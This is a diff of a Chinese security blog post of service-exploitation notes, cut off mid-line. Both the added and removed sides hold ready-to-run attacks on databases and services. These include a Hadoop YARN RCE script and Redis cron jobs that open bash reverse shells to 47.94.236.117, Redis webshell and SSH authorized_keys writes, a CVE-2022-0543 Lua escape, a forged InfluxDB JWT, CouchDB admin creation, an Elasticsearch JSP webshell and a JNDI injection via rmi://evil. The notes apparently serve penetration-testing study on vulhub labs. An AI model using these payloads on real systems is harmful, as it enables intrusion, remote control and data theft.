@@ -24,13 +24,15 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
+  <meta name="keywords" content="渗透测试" />
+
 
 <link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/">
 
 
 
   <title>
- |
+XD22 3 服务攻防 - 信息安全 |
 Phut Hon = X_T = 天行健，君子以自强不息</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,23 +60,23 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
+  <h1 itemprop="name headline">XD22 3 服务攻防
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-07-04 01:44:47">
+  <span class="item" title="创建时间：2023-07-04 00:00:00">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-07-04T01:44:47+08:00">2023-07-04</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-04T00:00:00+08:00">2023-07-04</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>29k</span>
+    <span>26k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -82,7 +84,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>48 分钟</span>
+    <span>43 分钟</span>
   </span>
 </div>
 
@@ -115,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YR8Qc1kd6WE3lSq.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DgEuWxkZS9RwIlz.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YEamGBSIV7f2MAH.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wM1vF7Eipkbmzlg.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ixAYytdZ8HLRET2.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NFMXjWC8xLSV4OD.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/X1rsLTk5JUecDzf.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/C83rXtNWOS4dPh6.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/69RMbK3Oref4Vqo.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/I2FJTgzYkwqh7rd.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/PJpRugYe4fBbxhD.jpg"></li>
         </ul>
       </div>
     </header>
@@ -145,7 +147,9 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">首页</a></span>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
@@ -164,648 +168,306 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h3 id="31-数据库安全"><a class="markdownIt-Anchor" href="#31-数据库安全">#</a> 3.1 数据库安全</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 注意各种漏洞的产生都与其版本和其相关配置是否安全有关</span><br></pre></td></tr></table></figure>
-<h4 id="311-mysql未授权访问"><a class="markdownIt-Anchor" href="#311-mysql未授权访问">#</a> 3.1.1 mysql 未授权访问</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mysql-未授权访问：</span><br><span class="line">CVE- 2012 - 2122 利用 for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -</span><br><span class="line">P3306 ; done通过此漏洞不断的访问mysql，最终可以无需认证进入数据库，但</span><br><span class="line">是这个是很早之前的漏洞了，基本上已经销声匿迹了。</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| vulfocus部署技巧</span><br></pre></td></tr></table></figure>
-<ol>
-<li>
-<h1 id="通过docker-安装vulfocus"><a class="markdownIt-Anchor" href="#通过docker-安装vulfocus">#</a> 通过 docker 安装 vulfocus</h1>
-</li>
-<li>docker pull vulfocus/vulfocus:latest</li>
-<li>docker create - p 82:80 - v /var/run/docker.sock:/var/run/docker.sock -<br>
-e VUL_IP= 110 .42.178.227 - e <span class="exturl" data-url="bWFpbHRvOkVNQUlMX0hPU1Q9JTIycm9vdEBtYWlsLmNvbQ==">EMAIL_HOST=&quot;root@mail.com</span>&quot; - e EMAIL_HOST_USER=“root” -<br>
-e EMAIL_HOST_PASSWORD=“Clash123!@#” vulfocus/vulfocus</li>
-<li>docker start container id</li>
-<li></li>
-<li>
+    <h3 id="数据库安全"><a class="markdownIt-Anchor" href="#数据库安全">#</a> 数据库安全</h3>
+<p>注意各种漏洞的产生都与其版本和其相关配置是否安全有关</p>
+<h4 id="mysql-未授权访问"><a class="markdownIt-Anchor" href="#mysql-未授权访问">#</a> mysql 未授权访问</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2012-2122 利用</span> </span><br><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过此漏洞不断的访问 mysql，最终可以无需认证进入数据库，但 是这个是很早之前的漏洞了，基本上已经销声匿迹了。</span></span><br></pre></td></tr></table></figure>
+<h4 id="hadoop未授权-rce"><a class="markdownIt-Anchor" href="#hadoop未授权-rce">#</a> hadoop 未授权 RCE</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">target = &#x27;http://123.58.236.76:31361/&#x27;</span><br><span class="line">lhost = &#x27;47.94.236.117&#x27; # put your local host ip here, and listen at port 9999</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">  &#x27;application-id&#x27;: app_id,</span><br><span class="line">  &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">  &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">    &#x27;commands&#x27;: &#123;</span><br><span class="line">      &#x27;command&#x27;: &#x27;/bin/bash -i &gt; &amp; /dev/tcp/%s/9999 0 &gt; &amp;1&#x27; % lhost,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+<h4 id="redis-写定时-写公钥"><a class="markdownIt-Anchor" href="#redis-写定时-写公钥">#</a> redis 写定时 写公钥</h4>
 <ul>
-<li>v /var/run/docker.sock:/var/run/docker.sock 为 docker 交互连接。</li>
+<li>redis 写 Webshell</li>
 </ul>
-</li>
-<li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用条件：Web目录权限可读写，需得到Web路径:</span></span><br><span class="line">config set dir /tmp #设置WEB写入目录</span><br><span class="line">config set dbfilename 1.php #设置写入文件名</span><br><span class="line">set test &quot;&lt;?php phpinfo();?&gt;&quot; #设置写入文件代码</span><br><span class="line">bgsave #保存执行</span><br><span class="line">save #保存执行</span><br></pre></td></tr></table></figure>
 <ul>
-<li>e DOCKER_URL 为 Docker 连接方式，默认通过 unix://var/run/docker.sock 进行连接，也可以<br>
-通过 tcp://xxx.xxx.xxx.xxx:2375 进行连接（必须开放 2375 端口）。</li>
+<li>写定时任务反弹 shell:</li>
 </ul>
-</li>
-<li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用条件：允许异地登录，安全模式protected-mode处于关闭状态</span></span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.94.236.117/5555 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dbfilename reverse_shell</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 <ul>
-<li>v /vulfocus-api/db.sqlite3:db.sqlite3 映射数据库为本地文件。</li>
+<li>写入 Linux ssh-key 公钥</li>
 </ul>
-</li>
-<li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用条件：允许异地登录，Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态，允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot; &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 118.31.57.214 -x set xxx</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line">ssh -i /root/.ssh/id_rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>
 <ul>
-<li>e VUL_IP=<span class="exturl" data-url="aHR0cDovL3h4eC54eHgueHh4Lnh4eA==">xxx.xxx.xxx.xxx</span> 为 Docker 服务器 IP ，不能为 127.0.0.1。</li>
+<li>RCE 自动化利用脚本</li>
 </ul>
-</li>
-<li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/vulhub/redis-rogue-getshell</span></span><br><span class="line">python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>e EMAIL_HOST=“<span class="exturl" data-url="aHR0cDovL3h4eC54eHgueHh4">xxx.xxx.xxx</span>” 为邮箱 SMTP 服务器</li>
+<li>沙箱绕过 RCE CVE-2022-0543 ：</li>
 </ul>
-</li>
-<li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/aodsec/CVE-2022-0543</span></span><br><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此漏洞较新，当确认有 redis未授权时，用redis-cli连接进来，可以直接执行系统命令</span></span><br></pre></td></tr></table></figure>
+<h4 id="influxdb-jwt伪造身份"><a class="markdownIt-Anchor" href="#influxdb-jwt伪造身份">#</a> influxdb jwt 伪造身份</h4>
+<p>influxdb 是一款著名的时序数据库，其使用 jwt 作为鉴权方式。在用户开启 了认证，但未设置参数 shared-secret 的情况下，jwt 的认证密钥为空字符串，此 时攻击者可以伪造任意用户身份在 influxdb 中执行 SQL 语句。</p>
+<p>漏洞复现地址: <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2luZmx1eGRiL3VuYWNjLw==">https://vulhub.org/#/environments/influxdb/unacc/</span></p>
+<p>环境启动后，访问 <span class="exturl" data-url="aHR0cDovL3lvdXItaXA6ODA4Ni9kZWJ1Zy92YXJz">http://your-ip:8086/debug/vars</span> 即可查看一些服务信息，但此时执行 SQL 语句则会出现 401 错误：其中，admin 是一个已经存在的用户， exp 是一个时间戳，代表着这个 token 的过期时间，设置为一个未来的时间戳。借助 <span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8vJUU2JTlEJUE1JUU3JTk0JTlGJUU2JTg4JTkw">https://jwt.io/ 来生成</span> jwt token:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123; </span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267 </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将空密钥生成的jwt代入到数据包中进行发送：</span></span><br><span class="line">Authorization: Bearer</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A</span><br><span class="line">db=sample&amp;q=show+users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以尝试查询一些敏感数据，后期是否能得到更高的系统权限需要看这个是否支持，否则的话就是只能读取数据。</span></span><br></pre></td></tr></table></figure>
+<h4 id="h2-database-jndi注入"><a class="markdownIt-Anchor" href="#h2-database-jndi注入">#</a> h2 database jndi 注入</h4>
+<p>H2 database 是一款 Java 内存数据库，多用于单元测试。H2 database 自带一个 Web 管理页面，在 Spirng 开发中，如果我们设置如下选项，即可允许外部用户访问 Web 管理页面，且没有鉴权。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.enabled=true</span><br><span class="line">spring.h2.console.settings.web-allow-others=true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用这个页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。</span> </span><br></pre></td></tr></table></figure>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvaDJkYXRhYmFzZS9oMi1jb25zb2xlLXVuYWNjL1JFQURNRS56aC1jbi5tZA==">https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md</span></p>
+<p>启动后，访问 <span class="exturl" data-url="aHR0cDovL3lvdXItaXA6ODA4MC9oMi1jb25zb2xlLyVFNSU4RCVCMyVFNSU4RiVBRiVFNiU5RiVBNSVFNyU5QyU4QiVFNSU4OCVCMA==">http://your-ip:8080/h2-console / 即可查看到</span> H2 database 的管理 页面。可以借助这个小工具 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvc2VwaFRyaWJiaWFubmkvSk5ESQ==">https://github.com/JosephTribbianni/JNDI</span> 简化我们的复现过程。</p>
+<p>首先设置 JNDI 工具中执行的命令为 touch /tmp/success, 然后启动 JNDI-1.0-all.jar，在 h2 console 页面填入 JNDI 类名和 URL 地址：其中，javax.naming. InitialContext 是 JNDI 的工厂类，URL rmi://evil:23456/BypassByEL 是运行 JNDI 工具监听的 RMI 地址。点击连接后，恶意 RMI 成功接收到请求:touch /tmp/success 已成功执行。</p>
+<h4 id="couchdb-纵向权限"><a class="markdownIt-Anchor" href="#couchdb-纵向权限">#</a> Couchdb 纵向权限</h4>
+<p>Apache CouchDB，使用语言用于一个性并成为 “一个完全方便 web 的数据 库”。它是一个使用 JSON 作为存储格式，JavaScript 查询，MapReduce 和 HTTPBBC 作为 API 的 NoSQL 数据库。它应用很广泛，如用在其动态展示平台， Credit Suisse 用在其商品的市场框架，Meebo，用在其内部社交内容平台 (网络 和应用程序)。</p>
+<p>在 2017 年 11 月 15 日，CVE-2017-12635 和 CVE-2017-12636，CVE-2017-12635 可能是由于 Erlang 和 JavaScript 对 JSON 解析方式的不同，导致 语句执行产生差异性导致的。让任意权限管理员，属于不同权限的用户创建权限。影响版本: &lt; 1.7.0 以及 &lt; 2.1.1</p>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNS9SRUFETUUuemgtY24ubWQ=">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12635/README.zh-cn.md</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送包含两个约束的数据包：</span></span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">成功创建管理员，密码密码vulhub，再次访问http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录。</span></span><br></pre></td></tr></table></figure>
+<p>Couchdb 任意命令执行漏洞的复现地址（直接用脚本完成就可以）:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNi9SRUFETUUuemgtY24ubWQ=">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/README.zh-cn.md</span></p>
+<h4 id="es-写-webshell"><a class="markdownIt-Anchor" href="#es-写-webshell">#</a> es 写 webshell</h4>
+<p>ElasticSearch 具有备份数据的功能，用户可以传入一个路径，让其将数据备 份到该路径下，且文件名和后缀都可控。所以，如果同文件系统下还跑着其他<br>
+服务，如 Tomcat、PHP 等，可以利用 ElasticSearch 的备份功能写入一个 webshell。</p>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2gvV29vWXVuLTIwMTUtMTEwMjE2Lw==">https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先创建一个恶意索引文档：</span></span><br><span class="line">curl -X POST [http://127.0.0.1:9200/yz.jsp/yz.jsp/1](http://127.0.0.1:9200/yz.jsp/yz.jsp/1) -d&#x27;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.get Parameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再创建一个恶意的存储库，其中location的值即为我要写入的路径。</span></span><br><span class="line">curl -X PUT &#x27;http://127.0.0.1:9200/_snapshot/yz.jsp&#x27; -d &#x27;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">    &quot;compress&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">存储库验证并创建:</span></span><br><span class="line">curl -X PUT &quot;http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;</span><br><span class="line">  &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">  &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;include_global_state&quot;: false</span><br><span class="line">&#125;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了。</span></span><br></pre></td></tr></table></figure>
+<p>其他 elasticSearch 漏洞：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2g=">https://vulhub.org/#/environments/elasticsearch</span></p>
+<h3 id="应用协议"><a class="markdownIt-Anchor" href="#应用协议">#</a> 应用协议</h3>
+<h4 id="ftp匿名登录"><a class="markdownIt-Anchor" href="#ftp匿名登录">#</a> ftp 匿名登录</h4>
 <ul>
-<li>e <span class="exturl" data-url="bWFpbHRvOkVNQUlMX0hPU1RfVVNFUj0lMjJ4eHhAeHh4LmNvbQ==">EMAIL_HOST_USER=&quot;xxx@xxx.com</span>&quot; 为邮箱账号</li>
+<li>FTP 的匿名登录一般有三种</li>
 </ul>
-</li>
-<li>
+<p>用户名：anonymous 密码：Email 或者为空</p>
+<p>用户名：FTP 密码：FTP 或者为空</p>
+<p>用户名：USER 密码：pass</p>
+<p>++ 此外 ftp 还可以用 hydra 进行爆破，知道账户 / 密码时候爆破效率更好</p>
 <ul>
-<li>e EMAIL_HOST_PASSWORD=&quot;xxxxxxxx 为邮箱密码</li>
+<li>Proftpd 协议漏洞</li>
 </ul>
-</li>
-<li>默认账户密码为 admin/admin。</li>
-<li>
-<h1 id="参考地址httpsfofaprogithubiovulfocusinstall"><a class="markdownIt-Anchor" href="#参考地址httpsfofaprogithubiovulfocusinstall">#</a> 参考地址 https://fofapro.github.io/vulfocus/#/INSTALL</h1>
-</li>
-<li></li>
-<li>docker search vulfocus --limit 100</li>
-<li>docker search vulfocus/weblogic --limit 100</li>
-<li>docker pull vulfocus/log4j2-rce- 2021 - 12 - 09</li>
-<li>添加镜像 - 本地导入 - 选择合适的镜像载入进去</li>
-</ol>
-<h4 id="312-hadoop未授权及rce"><a class="markdownIt-Anchor" href="#312-hadoop未授权及rce">#</a> 3.1.2 hadoop 未授权及 RCE</h4>
-<ol>
-<li>
-<p>import requests</p>
-</li>
-<li>
-<p>target = ‘<span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6MzEzNjEv">http://123.58.236.76:31361/</span>’</p>
-</li>
-<li>
-<p>lhost = ‘47.94.236.117’ # put your local host ip here, and listen at port 9999</p>
-</li>
-<li></li>
-<li>
-<p>url = target + ‘ws/v1/cluster/apps/new-application’</p>
-</li>
-<li>
-<p>resp = requests.post(url)</p>
-</li>
-<li>
-<p>app_id = resp.json()[‘application-id’]</p>
-</li>
-<li>
-<p>url = target + ‘ws/v1/cluster/apps’</p>
-</li>
-<li>
-<p>data = {</p>
-</li>
-<li>
-<p>‘application-id’: app_id,</p>
-</li>
-<li>
-<p>‘application-name’: ‘get-shell’,</p>
-</li>
-<li>
-<p>‘am-container-spec’: {</p>
-</li>
-<li>
-<p>‘commands’: {</p>
-</li>
-<li>
-<p>‘command’: ‘/bin/bash - i <strong>&gt;</strong> &amp; /dev/tcp/%s/9999 0 <strong>&gt;</strong> &amp;1’ % lhost,</p>
-</li>
-<li>
-<p>},</p>
-</li>
-<li>
-<p>},</p>
-</li>
-<li>
-<p>‘application-type’: ‘YARN’,</p>
-</li>
-<li>
-<p>}</p>
-</li>
-<li>
-<p>requests.post(url, json=data)</p>
-</li>
-</ol>
-<h4 id="313-redis定时任务及写ssh公钥"><a class="markdownIt-Anchor" href="#313-redis定时任务及写ssh公钥">#</a> 3.1.3 redis 定时任务及写 ssh 公钥</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">（ 1 ）redis写Webshell</span><br><span class="line">利用条件：Web目录权限可读写，需得到Web路径:</span><br><span class="line">config set dir /tmp #设置WEB写入目录</span><br><span class="line">config set dbfilename 1.php #设置写入文件名</span><br><span class="line">set test &quot;&lt;?php phpinfo();?&gt;&quot; #设置写入文件代码</span><br><span class="line">bgsave #保存执行</span><br><span class="line">save #保存执行</span><br><span class="line">（ 2 ）写定时任务反弹shell:</span><br><span class="line">利用条件：允许异地登录，安全模式protected-mode处于关闭状态</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.94.236.117/5555 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dbfilename reverse_shell</span><br><span class="line">save</span><br><span class="line">（ 3 ）写入Linux ssh-key公钥</span><br><span class="line">利用条件：允许异地登录，Redis服务使用ROOT账号启动，安全模式protected-mode处</span><br><span class="line">于关闭状态，允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot; &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 118.31.57.214 -x set xxx</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line">ssh -i /root/.ssh/id_rsa 